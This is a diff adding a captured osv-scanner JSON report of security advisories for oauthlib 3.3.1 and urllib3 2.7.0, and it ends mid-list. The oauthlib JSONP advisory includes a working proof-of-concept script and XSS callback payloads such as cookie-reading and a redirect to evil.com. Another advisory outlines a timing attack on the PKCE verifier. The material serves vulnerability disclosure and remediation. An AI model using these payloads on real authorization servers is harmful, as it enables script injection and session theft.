@@ -1,0 +1,653 @@
+argv: ["rtk", "proxy", "<PRIVATE_RESEARCH>/osv-scanner", "scan", "source", "--config", "<PRIVATE_RESEARCH>/empty-config.toml", "--no-resolve", "--lockfile=requirements.txt:<PRIVATE_RESEARCH>/baseline.lock", "--format", "json"]
+cwd: <PRIVATE_RESEARCH>
+started_utc: 2026-09-30T15:47:24.993825+00:00
+ended_utc: 2026-09-30T15:47:25.549845+00:00
+exit_code: 1
+
+stdout:
+{
+  "results": [
+    {
+      "source": {
+        "path": "<PRIVATE_RESEARCH>/baseline.lock",
+        "type": "lockfile"
+      },
+      "packages": [
+        {
+          "package": {
+            "name": "oauthlib",
+            "version": "3.3.1",
+            "ecosystem": "PyPI"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-hj66-6f7g-4r5v"
+              ],
+              "aliases": [
+                "CVE-2026-49264",
+                "GHSA-hj66-6f7g-4r5v"
+              ],
+              "max_severity": "6.1"
+            },
+            {
+              "ids": [
+                "GHSA-xpv3-w29h-x7cv"
+              ],
+              "aliases": [
+                "CVE-2026-49265",
+                "GHSA-xpv3-w29h-x7cv"
+              ],
+              "max_severity": "6.8"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 3.3.1",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-hj66-6f7g-4r5v/GHSA-hj66-6f7g-4r5v.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "oauthlib",
+                    "purl": "pkg:pypi/oauthlib"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0.6.1"
+                        },
+                        {
+                          "fixed": "4.0.0"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "0.6.1",
+                    "0.6.2",
+                    "0.6.3",
+                    "0.7.0",
+                    "0.7.1",
+                    "0.7.2",
+                    "1.0.0",
+                    "1.0.1",
+                    "1.0.2",
+                    "1.0.3",
+                    "1.1.0",
+                    "1.1.1",
+                    "1.1.2",
+                    "2.0.0",
+                    "2.0.1",
+                    "2.0.2",
+                    "2.0.3",
+                    "2.0.4",
+                    "2.0.5",
+                    "2.0.6",
+                    "2.0.7",
+                    "2.1.0",
+                    "3.0.0",
+                    "3.0.1",
+                    "3.0.2",
+                    "3.1.0",
+                    "3.1.1",
+                    "3.2.0",
+                    "3.2.1",
+                    "3.2.2",
+                    "3.3.0",
+                    "3.3.1"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-49264"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-79"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-09-29T17:53:41Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\nWhen `enable_jsonp=True`, oauthlib's `RevocationEndpoint` reflects the user-supplied `callback` parameter directly into JavaScript response bodies on both success and error paths without validating that it is a legal JSONP callback name. This allows arbitrary JavaScript response generation instead of a restricted function call, making the documented JSONP revocation feature unsafe for browser-based JSONP consumption when attackers can influence `callback`.\n\n### Details\n\nThe issue is in `oauthlib/oauth2/rfc6749/endpoints/revocation.py`.\n\nWhen `enable_jsonp=True` is passed to the `RevocationEndpoint` constructor, two code paths wrap the response body using the user-supplied `request.callback` parameter:\n\n```python\n# Error response path (line 72-73):\nif self.enable_jsonp and request.callback:\n    response_body = '{}({});'.format(request.callback, response_body)\n\n# Success response path (line 81-82):\nif self.enable_jsonp and request.callback:\n    response_body = request.callback + '();'\n```\n\nThe `request.callback` value comes from HTTP request parameters, either the query string or POST body, via the `Request` class in `oauthlib/common.py` (lines 394-395), which merges query and body parameters into `_params`. Any value the client sends as `callback` is used verbatim.\n\nThere is no validation of any kind on the callback parameter:\n- No check that it is a valid JavaScript identifier\n- No whitelist of allowed characters\n- No escaping or sanitization\n\nA safe JSONP implementation must validate that the callback is a legal JavaScript function name (e.g., matching `^[a-zA-Z_$][a-zA-Z0-9_$.]*$`). Without this, the attacker controls the JavaScript code returned in the response body. This is the standard mitigation used by jQuery, Express.js, Google APIs, and other major JSONP implementations.\n\n**How the injection works:**\n\nAn attacker sends a revocation request with a crafted callback value:\n\n```\nPOST /revoke HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\ntoken=anything\u0026callback=alert(document.cookie)//\n```\n\nThe server responds with:\n\n```\nalert(document.cookie)//({\"error\": \"invalid_client\"});\n```\n\nThis is syntactically valid JavaScript. `alert(document.cookie)` executes as a statement, and `//` comments out the rest of the line. The attacker has full control over the code that appears before the `//`.\n\n**Execution context and attack surface:**\n\nJSONP works by having a browser load a remote script via `\u003cscript src=\"...\"\u003e`. The loaded script executes in the origin of the **including page**, not the remote server. This means a `\u003cscript src=\"https://auth.example.com/revoke?token=x\u0026callback=payload\"\u003e` tag on `evil.com` would execute the payload in `evil.com`'s context, not the auth server's context.\n\nThe impact comes from client-side integrations that consume this endpoint as trusted JSONP. If a legitimate OAuth client includes `\u003cscript src\u003e` pointed at the revocation endpoint and an attacker can influence the callback value (e.g., via query parameter injection, a reflected value, or a man-in-the-middle downgrade), the attacker controls what code runs in the client application's origin. The authorization server becomes a source of attacker-controlled JavaScript that client applications trust and execute.\n\nNote: the `enable_jsonp` parameter defaults to `False`, so only deployments that explicitly opt in are affected. However, this is a supported, documented library feature, not a debug flag. The client-side library includes `prepare_token_revocation_request()` with an explicit `callback` parameter (`oauthlib/oauth2/rfc6749/parameters.py`, line 174), and the documentation shows JSONP revocation as a use case (`oauthlib/oauth2/rfc6749/clients/base.py`, lines 351-358). The existing test suite tests JSONP callback reflection with a benign value (`test_revocation_endpoint.py`, lines 91-101) but does not test for injection. Deployments that enable JSONP typically do so to support older browsers or cross-origin revocation from JavaScript clients, these are exactly the environments most sensitive to script injection.\n\n### PoC\n\n**Requirements:** Python 3.x with oauthlib installed (`pip install oauthlib`).\n\n```python\nfrom oauthlib.oauth2.rfc6749.endpoints.revocation import RevocationEndpoint\nfrom oauthlib.oauth2.rfc6749.request_validator import RequestValidator\n\n\nclass FailValidator(RequestValidator):\n    \"\"\"Auth fails -\u003e triggers error response path (lines 72-73).\"\"\"\n    def client_authentication_required(self, request, *a, **kw): return True\n    def authenticate_client(self, request, *a, **kw): return False\n    def authenticate_client_id(self, client_id, request, *a, **kw): return False\n\n\nclass PassValidator(RequestValidator):\n    \"\"\"Auth passes -\u003e triggers success response path (lines 81-82).\"\"\"\n    def client_authentication_required(self, request, *a, **kw): return False\n    def authenticate_client_id(self, client_id, request, *a, **kw): return True\n    def revoke_token(self, token, token_type_hint, request, *a, **kw): pass\n\n\npayloads = [\n    \"alert(document.cookie)//\",\n    \"window.location='https://evil.com/'//\",\n    \"eval('malicious')//\",\n]\n\n# --- Error path (401) ---\nprint(\"Error path (enable_jsonp=True, auth fails):\")\nep_fail = RevocationEndpoint(FailValidator(), enable_jsonp=True)\nfor p in payloads:\n    h, body, status = ep_fail.create_revocation_response(\n        \"https://auth.example.com/revoke\", http_method=\"POST\",\n        body=f\"token=x\u0026callback={p}\")\n    assert p in body, \"Payload not reflected\"\n    print(f\"  [{status}] Content-Type: {h.get('Content-Type','(none)')}  Body: {body}\")\n\n# --- Success path (200) ---\nprint(\"\\nSuccess path (enable_jsonp=True, revocation succeeds):\")\nep_pass = RevocationEndpoint(PassValidator(), enable_jsonp=True)\nfor p in payloads:\n    h, body, status = ep_pass.create_revocation_response(\n        \"https://auth.example.com/revoke\", http_method=\"POST\",\n        body=f\"token=x\u0026callback={p}\")\n    assert p in body, \"Payload not reflected\"\n    print(f\"  [{status}] Content-Type: {h.get('Content-Type','(none)')}  Body: {body}\")\n\n# --- Control (default: enable_jsonp=False) ---\nprint(\"\\nControl (enable_jsonp=False, default):\")\nep_safe = RevocationEndpoint(FailValidator(), enable_jsonp=False)\n_, body, status = ep_safe.create_revocation_response(\n    \"https://auth.example.com/revoke\", http_method=\"POST\",\n    body=\"token=x\u0026callback=alert(1)//\")\nassert \"alert\" not in body, \"Payload should not be present\"\nprint(f\"  [{status}] {body}\")\nprint(\"\\nAll assertions passed.\")\n```\n\n**Expected output:**\n\n```\nError path (enable_jsonp=True, auth fails):\n  [401] Content-Type: application/json  Body: alert(document.cookie)//({\"error\": \"invalid_client\"});\n  [401] Content-Type: application/json  Body: window.location='https://evil.com/'//({\"error\": \"invalid_client\"});\n  [401] Content-Type: application/json  Body: eval('malicious')//({\"error\": \"invalid_client\"});\n\nSuccess path (enable_jsonp=True, revocation succeeds):\n  [200] Content-Type: (none)  Body: alert(document.cookie)//();\n  [200] Content-Type: (none)  Body: window.location='https://evil.com/'//();\n  [200] Content-Type: (none)  Body: eval('malicious')//();\n\nControl (enable_jsonp=False, default):\n  [401] {\"error\": \"invalid_client\"}\n\nAll assertions passed.\n```\n\nBoth paths reflect the attacker's payload verbatim into the response body.\n\n### Impact\n\nAny oauthlib-based authorization server that enables JSONP on the revocation endpoint (`enable_jsonp=True`) returns attacker-controlled JavaScript in its response body.\n\nAny page or application that loads this endpoint's response as JSONP and exposes attacker influence over the `callback` parameter will execute attacker-controlled code in its own origin. If a legitimate OAuth client uses JSONP revocation (as documented by oauthlib's client-side API) and an attacker can influence the callback value, the attacker controls what code runs in the client application, including access to the client page's DOM and any data normally accessible to scripts running in that origin.\n\nThe JSONP feature is intended for legacy cross-origin browser support. Deployments that need it are typically JavaScript-heavy clients, exactly the environment most sensitive to script injection.\n\n**Affected versions:** oauthlib \u003e= 0.6.1 through 3.3.1 (current) and master. The unsanitized callback has been present since the revocation endpoint was first introduced in 2013 (commit `da775de`). The `enable_jsonp` gate was added in 2014 (commit `b85f89a`) but no validation of the callback value was ever added.\n\n### Suggested fix\n\nValidate the `callback` parameter against a strict pattern for legal JavaScript identifiers before using it in the response. Reject or ignore values that do not match:\n\n```python\nimport re\n\n# Only allow safe JSONP callback names: valid JS identifiers, optionally dot-separated\nJSONP_CALLBACK_PATTERN = re.compile(r'^[a-zA-Z_$][a-zA-Z0-9_$]*(\\.[a-zA-Z_$][a-zA-Z0-9_$]*)*$')\n\n# In create_revocation_response(), before using request.callback:\nif self.enable_jsonp and request.callback:\n    if not JSONP_CALLBACK_PATTERN.match(request.callback):\n        request.callback = None\n```\n\nThis is the standard mitigation for JSONP callback injection and is the approach used by jQuery, Express.js, and Google APIs. It ensures only syntactically valid function names like `package.hello_world` are accepted, while blocking payloads like `alert(document.cookie)//`.\n\nAs a secondary hardening measure, when JSONP is enabled, the response should set `Content-Type: application/javascript` (not `application/json` or empty) to ensure correct browser handling. Currently the success path returns no Content-Type at all, and the error path returns `application/json`.\n\nAlternatively, if JSONP is no longer considered a necessary feature, consider deprecating and removing the `enable_jsonp` option entirely. CORS is now supported by all modern browsers and is the standard mechanism for cross-origin API access.",
+              "id": "GHSA-hj66-6f7g-4r5v",
+              "modified": "2026-09-29T18:00:06.461704652Z",
+              "published": "2026-09-29T17:53:41Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/oauthlib/oauthlib/security/advisories/GHSA-hj66-6f7g-4r5v"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/oauthlib/oauthlib/pull/951"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/oauthlib/oauthlib/commit/c888359f3c42bec235b2c5caab2069c9ed62457c"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/oauthlib/oauthlib"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Oauthlib : Unsafe JSONP callback injection in RevocationEndpoint allows arbitrary JavaScript response generation"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-xpv3-w29h-x7cv/GHSA-xpv3-w29h-x7cv.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "oauthlib",
+                    "purl": "pkg:pypi/oauthlib"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "4.0.0"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "3.0.0",
+                    "3.0.1",
+                    "3.0.2",
+                    "3.1.0",
+                    "3.1.1",
+                    "3.2.0",
+                    "3.2.1",
+                    "3.2.2",
+                    "3.3.0",
+                    "3.3.1"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-49265"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-208"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-09-29T17:56:31Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              },
+              "details": "## Summary\n\nA timing side-channel vulnerability exists in the PKCE (RFC 7636) implementation \nof the Authorization Code Grant flow. The `code_challenge_method_plain` function \nuses Python's standard `==` operator for string comparison instead of a \nconstant-time comparison function, potentially allowing timing-based attacks.\n\n## Affected Component\n\n- File: `oauthlib/oauth2/rfc6749/grant_types/authorization_code.py`\n- Functions: `code_challenge_method_plain`, `code_challenge_method_s256`\n- Vulnerability Type: CWE-208 (Observable Timing Discrepancy)\n\n## Technical Details\n\nPython's `==` operator uses short-circuit evaluation when comparing strings:\n1. Returns `False` immediately if lengths differ\n2. Compares characters left-to-right, stopping at first mismatch\n\nThis means comparison time varies linearly with the length of the common prefix \nbetween the attacker-supplied verifier and the stored challenge, creating a \nmeasurable timing oracle.\n\n## Proof of Concept\n\nTested locally against oauthlib source (network jitter eliminated to isolate \npure Python execution time):\n\n| Input | Result | Time (10M iterations) |\n|---|---|---|\n| Wrong first char (`B` + `A`*49) | Fast reject | 0.34106s |\n| 49 chars correct (`A`*49 + `B`) | Deep compare | 0.37847s |\n| **Difference** | | **0.03741s** |\n\nThe ~37ms delta over 10M iterations corresponds to nanosecond-level differences \nper call, which are statistically exploitable under controlled conditions.\n\n## Attack Scenario\n\n1. Attacker intercepts `authorization_code` via Custom URI Scheme Hijacking\n2. PKCE blocks token request — attacker lacks `code_verifier`\n3. Attacker sends repeated requests to `/token` endpoint measuring response times\n4. Using timing oracle, attacker recovers `code_verifier` character by character\n5. Attacker obtains Access Token → Account Takeover\n\n\u003e **Note:** Practical exploitability is limited due to the single-use nature of \n\u003e authorization codes and real-world network noise. However, the vulnerable \n\u003e pattern should be corrected as a defense-in-depth measure.\n\n## Recommended Fix\n\nReplace `==` with `hmac.compare_digest()` for constant-time comparison:\n\ncr: Elvin Latifli",
+              "id": "GHSA-xpv3-w29h-x7cv",
+              "modified": "2026-09-29T18:15:04.747320327Z",
+              "published": "2026-09-29T17:56:31Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/oauthlib/oauthlib/security/advisories/GHSA-xpv3-w29h-x7cv"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/oauthlib/oauthlib/pull/963"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/oauthlib/oauthlib/commit/40b0ab56da3682c2484a4b78bbff309f8025d950"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/oauthlib/oauthlib"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Oauthlib: Timing Attack Vulnerability in PKCE code_verifier Comparison (CWE-208)"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "urllib3",
+            "version": "2.7.0",
+            "ecosystem": "PyPI"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-8988-9cw3-xx77"
+              ],
+              "aliases": [
+                "CVE-2026-97687",
+                "GHSA-8988-9cw3-xx77"
+              ],
+              "max_severity": "7.6"
+            },
+            {
+              "ids": [
+                "GHSA-gh4c-6fx4-qh6g"
+              ],
+              "aliases": [
+                "CVE-2026-97688",
+                "GHSA-gh4c-6fx4-qh6g"
+              ],
+              "max_severity": "6.9"
+            },
+            {
+              "ids": [
+                "GHSA-vxq7-64xx-v4gw"
+              ],
+              "aliases": [
+                "CVE-2026-97689",
+                "GHSA-vxq7-64xx-v4gw"
+              ],
+              "max_severity": "8.9"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-8988-9cw3-xx77/GHSA-8988-9cw3-xx77.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "urllib3",
+                    "purl": "pkg:pypi/urllib3"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "1.26.0"
+                        },
+                        {
+                          "fixed": "2.8.0"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "1.26.0",
+                    "1.26.1",
+                    "1.26.10",
+                    "1.26.11",
+                    "1.26.12",
+                    "1.26.13",
+                    "1.26.14",
+                    "1.26.15",
+                    "1.26.16",
+                    "1.26.17",
+                    "1.26.18",
+                    "1.26.19",
+                    "1.26.2",
+                    "1.26.20",
+                    "1.26.3",
+                    "1.26.4",
+                    "1.26.5",
+                    "1.26.6",
+                    "1.26.7",
+                    "1.26.8",
+                    "1.26.9",
+                    "2.0.0",
+                    "2.0.0a1",
+                    "2.0.0a2",
+                    "2.0.0a3",
+                    "2.0.0a4",
+                    "2.0.1",
+                    "2.0.2",
+                    "2.0.3",
+                    "2.0.4",
+                    "2.0.5",
+                    "2.0.6",
+                    "2.0.7",
+                    "2.1.0",
+                    "2.2.0",
+                    "2.2.1",
+                    "2.2.2",
+                    "2.2.3",
+                    "2.3.0",
+                    "2.4.0",
+                    "2.5.0",
+                    "2.6.0",
+                    "2.6.1",
+                    "2.6.2",
+                    "2.6.3",
+                    "2.7.0"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-97687"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-295",
+                  "CWE-440"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-09-30T14:46:04Z",
+                "nvd_published_at": "2026-09-29T16:17:18Z",
+                "severity": "HIGH"
+              },
+              "details": "## Impact\n\nurllib3 supports configuring TLS independently for an HTTPS proxy and the target server.\n\n`proxy_ssl_context`, `proxy_assert_hostname`, and `proxy_assert_fingerprint` configure the TLS connection to the proxy. `ssl_context` and the other target-specific TLS parameters configure the connection to the target server.\n\nIn urllib3 versions 1.26.0 through 2.7.0, these configurations were not consistently separated. Depending on the proxy mode, urllib3 could:\n\n1. Ignore `proxy_ssl_context` and use the target server's SSL context for the TLS connection to an HTTPS forwarding proxy.\n2. Override the HTTPS proxy's certificate-verification policy with the target server's certificate-verification policy.\n3. Apply target-specific SNI, hostname assertions, certificate fingerprint assertions, or TLS client credentials to the TLS connection to an HTTPS forwarding proxy.\n\nIn particular, configuring `cert_reqs=\"CERT_NONE\"` for a target server could overwrite the `verify_mode` of the SSL context configured for the HTTPS proxy. This modification occurred in place and persisted on the context object, potentially disabling proxy certificate verification for later connections that reused the same context.\n\nAn attacker able to intercept the connection to an HTTPS proxy may be able to impersonate the proxy when the effective proxy TLS configuration disables certificate verification or otherwise accepts the attacker's certificate. This may occur, for example, when the target server's trust or identity policy is incorrectly applied to the proxy connection.\n\nWhen HTTPS forwarding is enabled, an impersonated proxy can observe or modify forwarded requests and responses, potentially exposing credentials, authentication tokens, request bodies, response data, and other sensitive information.\n\nA TLS client certificate intended for the target server may also be presented to the proxy or to an attacker impersonating it. This can disclose the client's identity and provide proof of possession of the corresponding private key. The private key itself is not transmitted during the TLS handshake.\n\nIn CONNECT tunneling mode, impersonating the HTTPS proxy does not by itself defeat the separate end-to-end TLS connection between the client and the target server.\n\n## Affected Usages\n\nCode using urllib3 versions 1.26.0 through 2.7.0 may be affected in any of the following cases.\n\n### 1. The target SSL context is used for an HTTPS forwarding proxy\n\nHTTPS requests are forwarded through an HTTPS proxy with `use_forwarding_for_https=True`, and `proxy_ssl_context` is configured for the proxy.\n\nurllib3 may ignore `proxy_ssl_context` and use the target server's `ssl_context` for the proxy TLS handshake. The proxy may therefore be verified using the target server's trust and certificate policy instead of the policy explicitly configured for the proxy.\n\n### 2. The target verification policy overrides the proxy policy\n\nAn HTTPS proxy is configured with `proxy_ssl_context`, while the target server uses a different certificate-verification policy.\n\nurllib3 may apply the target server's `cert_reqs` value to the proxy SSL context. For example, setting `cert_reqs=\"CERT_NONE\"` for the target server may also disable certificate verification for the HTTPS proxy, even when `proxy_ssl_context` was configured to require verification.\n\nThis issue can affect the TLS connection to an HTTPS proxy in both forwarding and CONNECT tunneling configurations.\n\n### 3. A mutated proxy SSL context is reused\n\nThe same SSL context is reused as `proxy_ssl_context` across multiple connections, and certificate verification is disabled for one target server.\n\nurllib3 may modify the proxy SSL context's `verify_mode` in place. Later connections that reuse the same context may therefore connect to the HTTPS proxy without certificate verification.\n\n### 4. Target-specific TLS identity or credentials are applied to the proxy\n\nHTTPS requests are forwarded through an HTTPS proxy with `use_forwarding_for_https=True`, and target-specific SNI, hostname assertions, certificate fingerprint assertions, or TLS client credentials are configured.\n\nurllib3 may apply these target-specific settings to the proxy TLS handshake. This may cause urllib3 to:\n\n- send SNI intended for the target server to the proxy;\n- verify the proxy using a hostname or certificate fingerprint intended for the target server; or\n- present a TLS client certificate intended for the target server to the proxy.\n\nCode connecting through a plain HTTP proxy does not establish a TLS connection to the proxy and is not affected by this issue.\n\n## Remediation\n\nUpgrade to urllib3 2.8.0 or later.\n\nurllib3 2.8.0 independently applies the explicitly configured `proxy_ssl_context` and proxy-specific certificate assertions to the HTTPS proxy connection. Target-specific SNI, certificate assertions, and TLS client certificate parameters are no longer applied to the HTTPS proxy handshake.\n\nFor backward compatibility, when an HTTPS proxy is used with `use_forwarding_for_https=True` and `proxy_ssl_context` is not provided, urllib3 2.8.0 continues to use `ssl_context` for the TLS connection to the proxy. This configuration emits a `FutureWarning`. In urllib3 3.0, passing `ssl_context` with `use_forwarding_for_https=True` for an HTTPS proxy will raise an error. Applications should use `proxy_ssl_context` to configure TLS for an HTTPS forwarding proxy.\n\nThe fixes were implemented in commits b6447295fff7b38fdffc67e0df9712d60cef3cc3 and 07408cec79d1856d81bb42c74a904a24fdb9e465.",
+              "id": "GHSA-8988-9cw3-xx77",
+              "modified": "2026-09-30T15:00:05.369237042Z",
+              "published": "2026-09-30T14:46:04Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/urllib3/urllib3/security/advisories/GHSA-8988-9cw3-xx77"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-97687"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/urllib3/urllib3/pull/5093"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/urllib3/urllib3/commit/07408cec79d1856d81bb42c74a904a24fdb9e465"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/urllib3/urllib3/commit/b6447295fff7b38fdffc67e0df9712d60cef3cc3"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/urllib3/urllib3"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/urllib3/urllib3/releases/tag/2.8.0"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "urllib3: HTTPS proxy TLS configuration may be ignored or overridden"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-gh4c-6fx4-qh6g/GHSA-gh4c-6fx4-qh6g.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "urllib3",
+                    "purl": "pkg:pypi/urllib3"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.6.2"
+                        },
+                        {
+                          "fixed": "2.8.0"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "2.6.2",
+                    "2.6.3",
+                    "2.7.0"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-97688"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-835"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-09-30T15:00:38Z",
+                "nvd_published_at": "2026-09-29T16:17:18Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Impact\n\nurllib3's streaming API is designed for the efficient handling of large HTTP responses by reading content in chunks instead of loading the entire response body into memory at once.\n\nurllib3 can decompress response bodies according to the HTTP `Content-Encoding` header. When streaming a compressed, chunked response, urllib3 first consumes data already buffered by the decoder before reading the next HTTP chunk.\n\nHowever, urllib3 versions from 2.6.2 through 2.7.0 could enter an infinite loop when a chunked response contained bytes after the end of the Deflate stream. If the decompressed body exceeded the requested streaming chunk size, Python's zlib implementation could retain the trailing bytes as unconsumed input after reaching the end of the compressed stream. urllib3 would repeatedly attempt to decode those same bytes without making progress or reading more data from the network.\n\nA malicious server could exploit this behavior to cause excessive CPU usage and prevent the affected request from completing on the client. Network read timeouts would not interrupt the loop because no further socket operation was required.\n\n### Affected usages\n\nApplications and libraries using urllib3 versions 2.6.2 through 2.7.0 may be affected when all of the following conditions are met:\n\n1. Compressed responses from an untrusted source are streamed using `HTTPResponse.stream(amt=N)` or `HTTPResponse.read_chunked(amt=N)` with a positive, finite chunk size.\n2. Content decoding is enabled.\n3. The response uses both `Transfer-Encoding: chunked` and `Content-Encoding: deflate`.\n4. The decoded body exceeds the requested chunk size and the encoded body contains bytes after the end of the Deflate stream.\n\n`HTTPResponse.stream()` uses a finite chunk size by default and is therefore affected when the other conditions are met.\n\n### Remediation\n\nUpgrade to urllib3 2.8.0, in which the Deflate decoder stops accepting input after reaching the end of the compressed stream and no longer reports trailing bytes as data that can produce more decoded output.\n\nIf upgrading is not immediately possible, disable automatic content decoding for responses from untrusted sources by setting `decode_content=False`, or reject streamed responses using the Deflate content encoding. Applications that disable automatic decoding must handle the compressed response safely at another layer.",
+              "id": "GHSA-gh4c-6fx4-qh6g",
+              "modified": "2026-09-30T15:15:04.066660799Z",
+              "published": "2026-09-30T15:00:38Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/urllib3/urllib3/security/advisories/GHSA-gh4c-6fx4-qh6g"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-97688"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/urllib3/urllib3/commit/ea2ad7b21a80da3632f80016526a18864586077f"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/urllib3/urllib3"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/urllib3/urllib3/releases/tag/2.8.0"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "urllib3: Chunked Deflate streaming can enter an infinite loop"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-vxq7-64xx-v4gw/GHSA-vxq7-64xx-v4gw.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "urllib3",
+                    "purl": "pkg:pypi/urllib3"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "1.10.3"
+                        },
+                        {
+                          "fixed": "2.8.0"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "1.10.3",
+                    "1.10.4",
+                    "1.11",
+                    "1.12",
+                    "1.13",
+                    "1.13.1",
+                    "1.14",
+                    "1.15",
+                    "1.15.1",
+                    "1.16",
+                    "1.17",
+                    "1.18",
+                    "1.18.1",
+                    "1.19",
+                    "1.19.1",
+                    "1.20",
+                    "1.21",
+                    "1.21.1",
+                    "1.22",
+                    "1.23",
+                    "1.24",
+                    "1.24.1",
+                    "1.24.2",
+                    "1.24.3",
+                    "1.25",
+                    "1.25.1",
+                    "1.25.10",
+                    "1.25.11",
+                    "1.25.2",
+                    "1.25.3",
+                    "1.25.4",
+                    "1.25.5",
+                    "1.25.6",
+                    "1.25.7",
+                    "1.25.8",
+                    "1.25.9",
+                    "1.26.0",
+                    "1.26.1",
+                    "1.26.10",
+                    "1.26.11",
+                    "1.26.12",
+                    "1.26.13",
+                    "1.26.14",
+                    "1.26.15",
+                    "1.26.16",
+                    "1.26.17",
+                    "1.26.18",
+                    "1.26.19",
+                    "1.26.2",
+                    "1.26.20",
+                    "1.26.3",
+                    "1.26.4",
+                    "1.26.5",
+                    "1.26.6",
+                    "1.26.7",
+                    "1.26.8",
+                    "1.26.9",
+                    "2.0.0",
+                    "2.0.0a1",
+                    "2.0.0a2",
+                    "2.0.0a3",
+                    "2.0.0a4",
+                    "2.0.1",
+                    "2.0.2",
+                    "2.0.3",
